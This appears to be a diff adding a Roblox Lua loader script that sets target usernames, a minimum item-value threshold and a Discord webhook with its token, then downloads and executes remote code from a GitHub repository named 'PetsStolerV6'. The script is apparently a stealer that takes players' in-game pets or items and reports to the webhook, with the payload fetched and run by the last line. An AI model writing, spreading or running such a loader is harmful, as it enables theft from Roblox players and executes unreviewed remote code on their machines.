@@ -1,0 +1,6 @@
+Username = "Logankingjr7"
+Username2 = "Logankingjr7"
+MinimumRAP = 50000
+Webhook = "https://discord.com/api/webhooks/1339713861388865677/tY-WjoBFfIPC6Se5Pw7cG6elWqmPQtOLV7rtF2XXFYwtKQRBUSw54ei84F4oT3qbDSNR"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Logankingjr7/PetsStolerV6/refs/heads/main/PetsStolerV6", true))()
